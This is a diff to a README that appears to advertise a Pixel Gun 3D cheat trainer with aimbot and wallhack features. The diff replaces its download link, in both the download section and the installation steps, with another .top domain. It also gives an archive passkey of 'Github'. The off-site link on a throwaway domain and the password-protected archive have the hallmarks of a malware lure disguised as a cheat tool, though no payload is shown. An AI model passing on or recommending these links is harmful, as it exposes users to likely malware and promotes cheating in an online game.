@@ -9,7 +9,7 @@ Pixel Gun 3D trainer with aimbot, ESP wallhack, infinite ammo, rapid fire, no re
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -96,7 +96,7 @@ Based on open-source projects like **PixelGun3DPCCheat** and **PG3D-Internal-Bas
 
 ## 🔧 Installation / How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 
 2. Launch Pixel Gun 3D and load into the main menu.
 
